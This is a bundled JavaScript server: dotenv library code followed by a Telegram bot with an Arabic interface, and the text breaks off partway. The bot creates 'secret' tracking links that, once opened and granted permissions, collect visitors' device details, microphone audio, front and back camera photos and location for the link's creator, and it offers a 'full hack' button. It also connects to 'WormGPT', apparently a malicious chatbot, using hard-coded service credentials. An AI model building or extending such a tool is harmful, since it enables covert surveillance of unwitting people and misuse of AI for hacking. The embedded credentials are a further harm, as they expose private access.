var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __require = /* @__PURE__ */ ((x) => typeof require !== "undefined" ? require : typeof Proxy !== "undefined" ? new Proxy(x, {
  get: (a, b) => (typeof require !== "undefined" ? require : a)[b]
}) : x)(function(x) {
  if (typeof require !== "undefined") return require.apply(this, arguments);
  throw Error('Dynamic require of "' + x + '" is not supported');
});
var __commonJS = (cb, mod) => function __require2() {
  return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
};
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));

// node_modules/dotenv/lib/main.js
var require_main = __commonJS({
  "node_modules/dotenv/lib/main.js"(exports, module) {
    var fs = __require("fs");
    var path2 = __require("path");
    var os = __require("os");
    var crypto = __require("crypto");
    var TIPS = [
      "\u25C8 encrypted .env [www.dotenvx.com]",
      "\u25C8 secrets for agents [www.dotenvx.com]",
      "\u2301 auth for agents [www.vestauth.com]",
      "\u2318 custom filepath { path: '/custom/path/.env' }",
      "\u2318 enable debugging { debug: true }",
      "\u2318 override existing { override: true }",
      "\u2318 suppress logs { quiet: true }",
      "\u2318 multiple files { path: ['.env.local', '.env'] }"
    ];
    function _getRandomTip() {
      return TIPS[Math.floor(Math.random() * TIPS.length)];
    }
    function parseBoolean(value) {
      if (typeof value === "string") {
        return !["false", "0", "no", "off", ""].includes(value.toLowerCase());
      }
      return Boolean(value);
    }
    function supportsAnsi() {
      return process.stdout.isTTY;
    }
    function dim(text) {
      return supportsAnsi() ? `\x1B[2m${text}\x1B[0m` : text;
    }
    var LINE = /(?:^|^)\s*(?:export\s+)?([\w.-]+)(?:\s*=\s*?|:\s+?)(\s*'(?:\\'|[^'])*'|\s*"(?:\\"|[^"])*"|\s*`(?:\\`|[^`])*`|[^#\r\n]+)?\s*(?:#.*)?(?:$|$)/mg;
    function parse(src) {
      const obj = {};
      let lines = src.toString();
      lines = lines.replace(/\r\n?/mg, "\n");
      let match;
      while ((match = LINE.exec(lines)) != null) {
        const key = match[1];
        let value = match[2] || "";
        value = value.trim();
        const maybeQuote = value[0];
        value = value.replace(/^(['"`])([\s\S]*)\1$/mg, "$2");
        if (maybeQuote === '"') {
          value = value.replace(/\\n/g, "\n");
          value = value.replace(/\\r/g, "\r");
        }
        obj[key] = value;
      }
      return obj;
    }
    function _parseVault(options) {
      options = options || {};
      const vaultPath = _vaultPath(options);
      options.path = vaultPath;
      const result = DotenvModule.configDotenv(options);
      if (!result.parsed) {
        const err = new Error(`MISSING_DATA: Cannot parse ${vaultPath} for an unknown reason`);
        err.code = "MISSING_DATA";
        throw err;
      }
      const keys = _dotenvKey(options).split(",");
      const length = keys.length;
      let decrypted;
      for (let i = 0; i < length; i++) {
        try {
          const key = keys[i].trim();
          const attrs = _instructions(result, key);
          decrypted = DotenvModule.decrypt(attrs.ciphertext, attrs.key);
          break;
        } catch (error) {
          if (i + 1 >= length) {
            throw error;
          }
        }
      }
      return DotenvModule.parse(decrypted);
    }
    function _warn(message) {
      console.error(`\u26A0 ${message}`);
    }
    function _debug(message) {
      console.log(`\u2506 ${message}`);
    }
    function _log(message) {
      console.log(`\u25C7 ${message}`);
    }
    function _dotenvKey(options) {
      if (options && options.DOTENV_KEY && options.DOTENV_KEY.length > 0) {
        return options.DOTENV_KEY;
      }
      if (process.env.DOTENV_KEY && process.env.DOTENV_KEY.length > 0) {
        return process.env.DOTENV_KEY;
      }
      return "";
    }
    function _instructions(result, dotenvKey) {
      let uri;
      try {
        uri = new URL(dotenvKey);
      } catch (error) {
        if (error.code === "ERR_INVALID_URL") {
          const err = new Error("INVALID_DOTENV_KEY: Wrong format. Must be in valid uri format like dotenv://:key_1234@dotenvx.com/vault/.env.vault?environment=development");
          err.code = "INVALID_DOTENV_KEY";
          throw err;
        }
        throw error;
      }
      const key = uri.password;
      if (!key) {
        const err = new Error("INVALID_DOTENV_KEY: Missing key part");
        err.code = "INVALID_DOTENV_KEY";
        throw err;
      }
      const environment = uri.searchParams.get("environment");
      if (!environment) {
        const err = new Error("INVALID_DOTENV_KEY: Missing environment part");
        err.code = "INVALID_DOTENV_KEY";
        throw err;
      }
      const environmentKey = `DOTENV_VAULT_${environment.toUpperCase()}`;
      const ciphertext = result.parsed[environmentKey];
      if (!ciphertext) {
        const err = new Error(`NOT_FOUND_DOTENV_ENVIRONMENT: Cannot locate environment ${environmentKey} in your .env.vault file.`);
        err.code = "NOT_FOUND_DOTENV_ENVIRONMENT";
        throw err;
      }
      return { ciphertext, key };
    }
    function _vaultPath(options) {
      let possibleVaultPath = null;
      if (options && options.path && options.path.length > 0) {
        if (Array.isArray(options.path)) {
          for (const filepath of options.path) {
            if (fs.existsSync(filepath)) {
              possibleVaultPath = filepath.endsWith(".vault") ? filepath : `${filepath}.vault`;
            }
          }
        } else {
          possibleVaultPath = options.path.endsWith(".vault") ? options.path : `${options.path}.vault`;
        }
      } else {
        possibleVaultPath = path2.resolve(process.cwd(), ".env.vault");
      }
      if (fs.existsSync(possibleVaultPath)) {
        return possibleVaultPath;
      }
      return null;
    }
    function _resolveHome(envPath) {
      return envPath[0] === "~" ? path2.join(os.homedir(), envPath.slice(1)) : envPath;
    }
    function _configVault(options) {
      const debug = parseBoolean(process.env.DOTENV_CONFIG_DEBUG || options && options.debug);
      const quiet = parseBoolean(process.env.DOTENV_CONFIG_QUIET || options && options.quiet);
      if (debug || !quiet) {
        _log("loading env from encrypted .env.vault");
      }
      const parsed = DotenvModule._parseVault(options);
      let processEnv = process.env;
      if (options && options.processEnv != null) {
        processEnv = options.processEnv;
      }
      DotenvModule.populate(processEnv, parsed, options);
      return { parsed };
    }
    function configDotenv(options) {
      const dotenvPath = path2.resolve(process.cwd(), ".env");
      let encoding = "utf8";
      let processEnv = process.env;
      if (options && options.processEnv != null) {
        processEnv = options.processEnv;
      }
      let debug = parseBoolean(processEnv.DOTENV_CONFIG_DEBUG || options && options.debug);
      let quiet = parseBoolean(processEnv.DOTENV_CONFIG_QUIET || options && options.quiet);
      if (options && options.encoding) {
        encoding = options.encoding;
      } else {
        if (debug) {
          _debug("no encoding is specified (UTF-8 is used by default)");
        }
      }
      let optionPaths = [dotenvPath];
      if (options && options.path) {
        if (!Array.isArray(options.path)) {
          optionPaths = [_resolveHome(options.path)];
        } else {
          optionPaths = [];
          for (const filepath of options.path) {
            optionPaths.push(_resolveHome(filepath));
          }
        }
      }
      let lastError;
      const parsedAll = {};
      for (const path3 of optionPaths) {
        try {
          const parsed = DotenvModule.parse(fs.readFileSync(path3, { encoding }));
          DotenvModule.populate(parsedAll, parsed, options);
        } catch (e) {
          if (debug) {
            _debug(`failed to load ${path3} ${e.message}`);
          }
          lastError = e;
        }
      }
      const populated = DotenvModule.populate(processEnv, parsedAll, options);
      debug = parseBoolean(processEnv.DOTENV_CONFIG_DEBUG || debug);
      quiet = parseBoolean(processEnv.DOTENV_CONFIG_QUIET || quiet);
      if (debug || !quiet) {
        const keysCount = Object.keys(populated).length;
        const shortPaths = [];
        for (const filePath of optionPaths) {
          try {
            const relative = path2.relative(process.cwd(), filePath);
            shortPaths.push(relative);
          } catch (e) {
            if (debug) {
              _debug(`failed to load ${filePath} ${e.message}`);
            }
            lastError = e;
          }
        }
        _log(`injected env (${keysCount}) from ${shortPaths.join(",")} ${dim(`// tip: ${_getRandomTip()}`)}`);
      }
      if (lastError) {
        return { parsed: parsedAll, error: lastError };
      } else {
        return { parsed: parsedAll };
      }
    }
    function config(options) {
      if (_dotenvKey(options).length === 0) {
        return DotenvModule.configDotenv(options);
      }
      const vaultPath = _vaultPath(options);
      if (!vaultPath) {
        _warn(`you set DOTENV_KEY but you are missing a .env.vault file at ${vaultPath}`);
        return DotenvModule.configDotenv(options);
      }
      return DotenvModule._configVault(options);
    }
    function decrypt(encrypted, keyStr) {
      const key = Buffer.from(keyStr.slice(-64), "hex");
      let ciphertext = Buffer.from(encrypted, "base64");
      const nonce = ciphertext.subarray(0, 12);
      const authTag = ciphertext.subarray(-16);
      ciphertext = ciphertext.subarray(12, -16);
      try {
        const aesgcm = crypto.createDecipheriv("aes-256-gcm", key, nonce);
        aesgcm.setAuthTag(authTag);
        return `${aesgcm.update(ciphertext)}${aesgcm.final()}`;
      } catch (error) {
        const isRange = error instanceof RangeError;
        const invalidKeyLength = error.message === "Invalid key length";
        const decryptionFailed = error.message === "Unsupported state or unable to authenticate data";
        if (isRange || invalidKeyLength) {
          const err = new Error("INVALID_DOTENV_KEY: It must be 64 characters long (or more)");
          err.code = "INVALID_DOTENV_KEY";
          throw err;
        } else if (decryptionFailed) {
          const err = new Error("DECRYPTION_FAILED: Please check your DOTENV_KEY");
          err.code = "DECRYPTION_FAILED";
          throw err;
        } else {
          throw error;
        }
      }
    }
    function populate(processEnv, parsed, options = {}) {
      const debug = Boolean(options && options.debug);
      const override = Boolean(options && options.override);
      const populated = {};
      if (typeof parsed !== "object") {
        const err = new Error("OBJECT_REQUIRED: Please check the processEnv argument being passed to populate");
        err.code = "OBJECT_REQUIRED";
        throw err;
      }
      for (const key of Object.keys(parsed)) {
        if (Object.prototype.hasOwnProperty.call(processEnv, key)) {
          if (override === true) {
            processEnv[key] = parsed[key];
            populated[key] = parsed[key];
          }
          if (debug) {
            if (override === true) {
              _debug(`"${key}" is already defined and WAS overwritten`);
            } else {
              _debug(`"${key}" is already defined and was NOT overwritten`);
            }
          }
        } else {
          processEnv[key] = parsed[key];
          populated[key] = parsed[key];
        }
      }
      return populated;
    }
    var DotenvModule = {
      configDotenv,
      _configVault,
      _parseVault,
      config,
      decrypt,
      parse,
      populate
    };
    module.exports.configDotenv = DotenvModule.configDotenv;
    module.exports._configVault = DotenvModule._configVault;
    module.exports._parseVault = DotenvModule._parseVault;
    module.exports.config = DotenvModule.config;
    module.exports.decrypt = DotenvModule.decrypt;
    module.exports.parse = DotenvModule.parse;
    module.exports.populate = DotenvModule.populate;
    module.exports = DotenvModule;
  }
});

// server.ts
var import_dotenv = __toESM(require_main(), 1);
import express from "express";
import cors from "cors";
import { Telegraf, Markup } from "telegraf";
import Database from "better-sqlite3";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import_dotenv.default.config();
var __filename = fileURLToPath(import.meta.url);
var __dirname = path.dirname(__filename);
var PORT = 3e3;
var BOT_TOKEN = process.env.BOT_TOKEN || "";
var APP_URL = process.env.APP_URL || `http://localhost:${PORT}`;
var db = new Database("links.db");
db.exec(`
  CREATE TABLE IF NOT EXISTS links (
      link_id TEXT PRIMARY KEY,
      chat_id INTEGER,
      feature TEXT,
      created_at TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS visits (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      link_id TEXT,
      visitor_ip TEXT,
      feature TEXT,
      data TEXT,
      visited_at TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS custom_buttons (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      chat_id INTEGER,
      name TEXT,
      url TEXT
  );
`);
function getCustomButtons(chatId) {
  return db.prepare("SELECT * FROM custom_buttons WHERE chat_id = ?").all(chatId);
}
function addCustomButton(chatId, name, url) {
  const stmt = db.prepare("INSERT INTO custom_buttons (chat_id, name, url) VALUES (?, ?, ?)");
  stmt.run(chatId, name, url);
}
function updateCustomButton(id, chatId, name, url) {
  const stmt = db.prepare("UPDATE custom_buttons SET name = ?, url = ? WHERE id = ? AND chat_id = ?");
  stmt.run(name, url, id, chatId);
}
function deleteCustomButton(id, chatId) {
  const stmt = db.prepare("DELETE FROM custom_buttons WHERE id = ? AND chat_id = ?");
  stmt.run(id, chatId);
}
function getCustomButton(id, chatId) {
  return db.prepare("SELECT * FROM custom_buttons WHERE id = ? AND chat_id = ?").get(id, chatId);
}
function saveLink(linkId, chatId, feature) {
  const stmt = db.prepare("INSERT OR REPLACE INTO links (link_id, chat_id, feature, created_at) VALUES (?, ?, ?, ?)");
  stmt.run(linkId, chatId, feature, (/* @__PURE__ */ new Date()).toISOString());
}
function getLink(linkId) {
  const stmt = db.prepare("SELECT chat_id, feature FROM links WHERE link_id = ?");
  return stmt.get(linkId);
}
function saveVisit(linkId, visitorIp, feature, data) {
  const stmt = db.prepare("INSERT INTO visits (link_id, visitor_ip, feature, data, visited_at) VALUES (?, ?, ?, ?, ?)");
  stmt.run(linkId, visitorIp, feature, JSON.stringify(data), (/* @__PURE__ */ new Date()).toISOString());
}
var SUPABASE_URL = "https://aolckxwjfendnyrkrapc.supabase.co";
var CODE_KEY = "code_qIRFAu-YxGK8J-FIlobq";
var API_PASSWORD = "@HackerExos";
var OWNER_ID = 7845383853;
var _wormApiKey = null;
var _wormKeyExpires = 0;
async function getWormApiKey() {
  if (_wormApiKey && Date.now() < _wormKeyExpires) {
    return _wormApiKey;
  }
  try {
    const res = await fetch(`${SUPABASE_URL}/functions/v1/api-login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        telegram_id: String(OWNER_ID),
        password: API_PASSWORD,
        code_key: CODE_KEY
      })
    });
    if (res.ok) {
      const data = await res.json();
      if (data.success) {
        _wormApiKey = data.api_key;
        _wormKeyExpires = Date.now() + 300 * 1e3;
        return _wormApiKey;
      }
    }
  } catch (err) {
    console.error("WormGPT Login Error", err);
  }
  return null;
}
async function askWormGPT(message, clear_memory = false) {
  const apiKey = await getWormApiKey();
  if (!apiKey) return "\u274C \u0641\u0634\u0644 \u0627\u0644\u0627\u062A\u0635\u0627\u0644 \u0628\u0627\u0644\u062E\u0627\u062F\u0645";
  try {
    const res = await fetch(`${SUPABASE_URL}/functions/v1/wormgpt`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        api_key: apiKey,
        telegram_id: String(OWNER_ID),
        code_key: CODE_KEY,
        ...clear_memory ? { clear_memory: true } : {
          message,
          model: "V1",
          web_enabled: false,
          fix_code: false,
          stream: false
        }
      })
    });
    if (res.ok) {
      const data = await res.json();
      if (clear_memory) return "\u2705 \u062A\u0645 \u0645\u0633\u062D \u0627\u0644\u0630\u0627\u0643\u0631\u0629";
      return data.response || "\u274C \u0644\u0645 \u064A\u062A\u0645 \u0625\u0631\u062C\u0627\u0639 \u0631\u062F";
    }
    return `\u26A0\uFE0F \u062E\u0637\u0623 (${res.status})`;
  } catch (err) {
    return `\u26A0\uFE0F \u062E\u0637\u0623: ${err.message}`;
  }
}
var app = express();
app.use(cors());
app.use(express.json({ limit: "50mb" }));
var userPendingState = /* @__PURE__ */ new Map();
var tempButtonData = /* @__PURE__ */ new Map();
var bot = null;
if (BOT_TOKEN) {
  bot = new Telegraf(BOT_TOKEN);
  const checkSub = async (ctx, next) => {
    if (ctx.from?.id === Number(process.env.ADMIN_ID)) return next();
    try {
      const channels = ["-1003051514428", "@HackerExosVIP", "@HackerExos_vip"];
      let isSubscribed = true;
      for (const channel of channels) {
        try {
          const res = await ctx.telegram.getChatMember(channel, ctx.from.id);
          if (res.status === "left" || res.status === "kicked") {
            isSubscribed = false;
            break;
          }
        } catch (err) {
          isSubscribed = false;
        }
      }
      if (!isSubscribed || ctx.callbackQuery?.data === "check_sub") {
        const replyMsg = "\u26A0\uFE0F *\u0639\u0630\u0631\u0627\u064B\u060C \u064A\u062C\u0628 \u0639\u0644\u064A\u0643 \u0627\u0644\u0627\u0634\u062A\u0631\u0627\u0643 \u0641\u064A \u0642\u0646\u0648\u0627\u062A \u0627\u0644\u0628\u0648\u062A \u0644\u062A\u062A\u0645\u0643\u0646 \u0645\u0646 \u0627\u0633\u062A\u062E\u062F\u0627\u0645\u0647:*\n\n\u0627\u0634\u062A\u0631\u0643 \u062B\u0645 \u0627\u0636\u063A\u0637 \u0639\u0644\u0649 '\u2705 \u062A\u062D\u0642\u0642 \u0645\u0646 \u0627\u0644\u0627\u0634\u062A\u0631\u0627\u0643'";
        const keyboards = Markup.inlineKeyboard([
          [Markup.button.url("\u0627\u0644\u0642\u0646\u0627\u0629 \u0627\u0644\u062E\u0627\u0635\u0629 \u{1F512}", "https://t.me/+rOYB35YXFgM2OWE8")],
          [Markup.button.url("\u0627\u0644\u0642\u0646\u0627\u0629 \u0627\u0644\u0639\u0627\u0645\u0629 1 \u{1F4E2}", "https://t.me/HackerExosVIP")],
          [Markup.button.url("\u0627\u0644\u0642\u0646\u0627\u0629 \u0627\u0644\u0639\u0627\u0645\u0629 2 \u{1F4E2}", "https://t.me/HackerExos_vip")],
          [Markup.button.callback("\u2705 \u062A\u062D\u0642\u0642 \u0645\u0646 \u0627\u0644\u0627\u0634\u062A\u0631\u0627\u0643", "check_sub")]
        ]);
        if (ctx.callbackQuery?.data === "check_sub") {
          if (!isSubscribed) {
            return ctx.answerCbQuery("\u274C \u0644\u0645 \u062A\u0634\u062A\u0631\u0643 \u0641\u064A \u062C\u0645\u064A\u0639 \u0627\u0644\u0642\u0646\u0648\u0627\u062A \u0628\u0639\u062F!", { show_alert: true });
          } else {
            ctx.answerCbQuery("\u2705 \u0634\u0643\u0631\u0627\u064B \u0644\u0627\u0634\u062A\u0631\u0627\u0643\u0643! \u0623\u0631\u0633\u0644 /start \u0644\u0644\u0628\u062F\u0621.");
            ctx.deleteMessage().catch(() => {
            });
            return next();
          }
        } else {
          return ctx.reply(replyMsg, { parse_mode: "Markdown", ...keyboards });
        }
      }
    } catch (e) {
    }
    return next();
  };
  bot.use(checkSub);
  bot.start(async (ctx) => {
    userPendingState.delete(ctx.from.id);
    tempButtonData.delete(ctx.from.id);
    const instructions = `\u2728 *\u0623\u0647\u0644\u0627\u064B \u0628\u0643 \u0641\u064A \u0627\u0644\u0628\u0648\u062A!* \u2728

\u{1F4CC} *\u062A\u0639\u0644\u064A\u0645\u0627\u062A \u0627\u0644\u0627\u0633\u062A\u062E\u062F\u0627\u0645:*
1. \u0627\u062E\u062A\u0631 \u0646\u0648\u0639 \u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0625\u0646\u0634\u0627\u0621\u0647 \u0645\u0646 \u0627\u0644\u0623\u0632\u0631\u0627\u0631 \u0628\u0627\u0644\u0623\u0633\u0641\u0644.
2. (\u0644\u0628\u0639\u0636 \u0627\u0644\u0645\u064A\u0632\u0627\u062A) \u0633\u064A\u064F\u0637\u0644\u0628 \u0645\u0646\u0643 \u0625\u062F\u062E\u0627\u0644 \u0627\u0644\u0645\u062F\u0629 \u0627\u0644\u0645\u0637\u0644\u0648\u0628\u0629 \u0644\u0644\u062A\u0633\u062C\u064A\u0644.
3. \u0633\u064A\u0642\u0648\u0645 \u0627\u0644\u0628\u0648\u062A \u0628\u062A\u0648\u0644\u064A\u062F \u0631\u0627\u0628\u0637 \u0645\u062E\u0635\u0635 \u0633\u0631\u064A.
4. \u0642\u0645 \u0628\u0645\u0634\u0627\u0631\u0643\u0629 \u0647\u0630\u0627 \u0627\u0644\u0631\u0627\u0628\u0637.
5. \u0639\u0646\u062F\u0645\u0627 \u064A\u062A\u0645 \u0641\u062A\u062D \u0627\u0644\u0631\u0627\u0628\u0637 \u0648\u0625\u0639\u0637\u0627\u0621 \u0627\u0644\u0635\u0644\u0627\u062D\u064A\u0627\u062A\u060C \u0633\u064A\u062A\u0645 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A \u0625\u0644\u064A\u0643 \u0647\u0646\u0627 \u0645\u0628\u0627\u0634\u0631\u0629.`;
    const customBtns = getCustomButtons(7845383853);
    const extraButtons = [];
    if (customBtns.length > 0) {
      for (const b of customBtns) {
        extraButtons.push([Markup.button.url(b.name, b.url)]);
      }
    }
    const baseKeyboard = [
      ...extraButtons,
      [Markup.button.callback("\u{1F4BB} \u0645\u0639\u0644\u0648\u0645\u0627\u062A \u0627\u0644\u062C\u0647\u0627\u0632", "info"), Markup.button.callback("\u{1F399}\uFE0F \u062A\u0633\u062C\u064A\u0644 \u0635\u0648\u062A", "mic")],
      [Markup.button.callback("\u{1F4F8} \u0635\u0648\u0631\u0629 \u0623\u0645\u0627\u0645\u064A\u0629", "cameraF"), Markup.button.callback("\u{1F4F8} \u0635\u0648\u0631\u0629 \u062E\u0644\u0641\u064A\u0629", "cameraB")],
      [Markup.button.callback("\u{1F4CD} \u0645\u0648\u0642\u0639", "location"), Markup.button.callback("\u{1F527} \u062A\u0642\u0631\u064A\u0631 \u0634\u0627\u0645\u0644", "all")],
      [Markup.button.callback("\u{1F608} \u0648\u0648\u0631\u0645 \u062C\u064A \u0628\u064A \u062A\u064A", "btn_wormgpt_start"), Markup.button.callback("\u{1F525} \u0627\u062E\u062A\u0631\u0627\u0642 \u0643\u0627\u0645\u0644", "btn_full_hack")],
      [Markup.button.callback("\u{1F7E2} \u0641\u0643 \u062D\u0638\u0631 \u0648\u0627\u062A\u0633\u0627\u0628", "btn_whatsapp"), Markup.button.callback("\u{1F602} \u0627\u0639\u0637\u0646\u064A \u0646\u0643\u062A\u0629", "btn_joke")],
      [Markup.button.callback("\u{1F4F8} \u062D\u0638\u0631 \u0625\u0646\u0633\u062A\u062C\u0631\u0627\u0645", "btn_instagram"), Markup.button.callback("\u{1F3B5} \u062D\u0638\u0631 \u062A\u064A\u0643 \u062A\u0648\u0643", "btn_tiktok")],
      [Markup.button.callback("\u{1F6B7} \u062A\u0628\u0646\u064A\u062F \u0628\u062B \u062A\u064A\u0643 \u062A\u0648\u0643", "btn_tiktok_ban"), Markup.button.callback("\u{1F4BB} \u0643\u064A\u0641 \u062A\u0635\u0628\u062D \u0647\u0627\u0643\u0631", "btn_hacker")]
    ];
    if (ctx.from.id === 7845383853) {
      baseKeyboard.push([Markup.button.callback("\u2699\uFE0F \u0644\u0648\u062D\u0629 \u0627\u0644\u062A\u062D\u0643\u0645", "btn_control_panel")]);
    }
    await ctx.reply(
      instructions,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard(baseKeyboard)
      }
    ).catch((err) => console.error("Start Reply Error:", err));
  });
  const PROMPTS = {
    "btn_whatsapp": "\u0627\u0643\u062A\u0628 \u0644\u064A \u0631\u0633\u0627\u0644\u0629 \u0627\u062D\u062A\u0631\u0627\u0641\u064A\u0629 \u0648\u0642\u0648\u064A\u0629 \u0644\u0637\u0644\u0628 \u0641\u0643 \u062D\u0638\u0631 \u062D\u0633\u0627\u0628\u064A \u0639\u0644\u0649 \u0648\u0627\u062A\u0633\u0627\u0628.",
    "btn_joke": "\u0623\u0639\u0637\u0646\u064A \u0646\u0643\u062A\u0629 \u0639\u0631\u0628\u064A\u0629 \u0645\u0636\u062D\u0643\u0629 \u062C\u062F\u0627\u064B \u0648\u063A\u064A\u0631 \u0645\u0643\u0631\u0631\u0629",
    "btn_instagram": "\u0627\u0643\u062A\u0628 \u0644\u064A \u0631\u0633\u0627\u0644\u0629 \u0631\u0633\u0645\u064A\u0629 \u0628\u0627\u0644\u0644\u063A\u0629 \u0627\u0644\u0625\u0646\u062C\u0644\u064A\u0632\u064A\u0629 \u0644\u0634\u0631\u0643\u0629 \u0645\u064A\u062A\u0627 \u0644\u0637\u0644\u0628 \u0641\u0643 \u062D\u0638\u0631 \u062D\u0633\u0627\u0628\u064A \u0639\u0644\u0649 \u0625\u0646\u0633\u062A\u062C\u0631\u0627\u0645 \u0628\u0633\u0628\u0628 \u062E\u0637\u0623.",
    "btn_tiktok": "\u0627\u0643\u062A\u0628 \u0644\u064A \u0631\u0633\u0627\u0644\u0629 \u0645\u0642\u0646\u0639\u0629 \u0628\u0627\u0644\u0644\u063A\u0629 \u0627\u0644\u0625\u0646\u062C\u0644\u064A\u0632\u064A\u0629 \u0644\u0637\u0644\u0628 \u0641\u0643 \u062D\u0638\u0631 \u062D\u0633\u0627\u0628\u064A \u0639\u0644\u0649 \u062A\u064A\u0643 \u062A\u0648\u0643.",
    "btn_tiktok_ban": "\u0627\u0643\u062A\u0628 \u0644\u064A \u0631\u0633\u0627\u0644\u0629 \u0642\u0648\u064A\u0629 \u0628\u0627\u0644\u0644\u063A\u0629 \u0627\u0644\u0639\u0631\u0628\u064A\u0629 \u0644\u0644\u0625\u0628\u0644\u0627\u063A \u0639\u0646 \u0628\u062B \u0645\u0628\u0627\u0634\u0631 \u0645\u0633\u064A\u0621 \u062C\u062F\u0627\u064B \u0639\u0644\u0649 \u062A\u064A\u0643 \u062A\u0648\u0643 \u0644\u0637\u0644\u0628 \u062A\u0628\u0646\u064A\u062F\u0647 \u0641\u0648\u0631\u0627\u064B.",
    "btn_hacker": "\u0627\u0634\u0631\u062D \u0644\u064A \u0628\u0627\u0644\u062A\u0641\u0635\u064A\u0644 \u0648\u0628\u062E\u0637\u0648\u0627\u062A \u0648\u0627\u0636\u062D\u0629 \u0643\u064A\u0641 \u0623\u0628\u062F\u0623 \u0641\u064A \u0645\u062C\u0627\u0644 \u0627\u0644\u0623\u0645\u0646 \u0627\u0644\u0633\u064A\u0628\u0631\u0627\u0646\u064A (\u0627\u0644\u0647\u0627\u0643\u0631 \u0627\u0644\u0623\u062E\u0644\u0627\u0642\u064A) \u0645\u0646 \u0627\u0644\u0635\u0641\u0631."
  };
  bot.on("callback_query", async (ctx) => {
    try {
      const feature = ctx.callbackQuery.data;
      const chatId = ctx.from?.id;
      if (!chatId) return;
      if (feature === "check_sub") return;
      if (feature === "btn_wormgpt_start") {
        userPendingState.set(chatId, "WORM_CHAT");
        await ctx.editMessageText(
          "\u{1F916} **\u062A\u0645 \u0627\u0644\u062F\u062E\u0648\u0644 \u0641\u064A \u0648\u0636\u0639 \u0627\u0644\u062F\u0631\u062F\u0634\u0629 \u0645\u0639 \u0648\u0648\u0631\u0645 \u062C\u064A \u0628\u064A \u062A\u064A** \u{1F4AC}\n\n\u{1F5E3}\uFE0F \u0623\u0631\u0633\u0644 \u0631\u0633\u0627\u0644\u062A\u0643 \u0627\u0644\u0622\u0646 \u0648\u0633\u0623\u062C\u064A\u0628\u0643 \u0645\u0628\u0627\u0634\u0631\u0629.",
          {
            parse_mode: "Markdown",
            ...Markup.inlineKeyboard([[Markup.button.callback("\u{1F501} \u0625\u0639\u0627\u062F\u0629 \u0627\u0646\u0634\u0627\u0621 \u0627\u0644\u0645\u062D\u0627\u062F\u062B\u0629", "worm_chat_reset")]])
          }
        ).catch(() => {
        });
        return;
      }
      if (feature === "worm_chat_reset") {
        await askWormGPT("", true);
        await ctx.answerCbQuery("\u062A\u0645 \u0625\u0639\u0627\u062F\u0629 \u062A\u0639\u064A\u064A\u0646 \u0627\u0644\u0645\u062D\u0627\u062F\u062B\u0629 \u0648\u0645\u0633\u062D \u0627\u0644\u0630\u0627\u0643\u0631\u0629.").catch(() => {
        });
        userPendingState.delete(chatId);
        await ctx.editMessageText("\u062A\u0645 \u0625\u0639\u0627\u062F\u0629 \u062A\u0639\u064A\u064A\u0646 \u0627\u0644\u0645\u062D\u0627\u062F\u062B\u0629. \u064A\u0645\u0643\u0646\u0643 \u0625\u0631\u0633\u0627\u0644 /start \u0644\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u062E\u064A\u0627\u0631\u0627\u062A.").catch(() => {
        });
        return;
      }
      if (feature === "btn_control_panel") {
        await ctx.editMessageText("\u2699\uFE0F *\u0644\u0648\u062D\u0629 \u0627\u0644\u062A\u062D\u0643\u0645 \u0628\u0627\u0644\u0628\u0632\u0627\u0631\u0627\u0631 \u0627\u0644\u062E\u0627\u0635\u0629 \u0628\u0643:*", {
          parse_mode: "Markdown",
          ...Markup.inlineKeyboard([
            [Markup.button.callback("\u2795 \u0625\u0636\u0627\u0641\u0629 \u0632\u0631 \u062A\u0637\u0628\u064A\u0642", "btn_action_add")],
            [Markup.button.callback("\u2699\uFE0F \u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0623\u0632\u0631\u0627\u0631", "btn_action_manage")],
            [Markup.button.callback("\u{1F519} \u0631\u062C\u0648\u0639", "btn_back_to_start")]
          ])
        }).catch(() => {
        });
        await ctx.answerCbQuery().catch(() => {
        });
        return;
      }
      if (feature === "btn_back_to_start") {
        const customBtns = getCustomButtons(7845383853);
        const extraButtons = [];
        if (customBtns.length > 0) {
          for (const b of customBtns) {
            extraButtons.push([Markup.button.url(b.name, b.url)]);
          }
        }
        const baseKeyboard = [
          ...extraButtons,
          [Markup.button.callback("\u{1F4BB} \u0645\u0639\u0644\u0648\u0645\u0627\u062A \u0627\u0644\u062C\u0647\u0627\u0632", "info"), Markup.button.callback("\u{1F399}\uFE0F \u062A\u0633\u062C\u064A\u0644 \u0635\u0648\u062A", "mic")],
          [Markup.button.callback("\u{1F4F8} \u0635\u0648\u0631\u0629 \u0623\u0645\u0627\u0645\u064A\u0629", "cameraF"), Markup.button.callback("\u{1F4F8} \u0635\u0648\u0631\u0629 \u062E\u0644\u0641\u064A\u0629", "cameraB")],
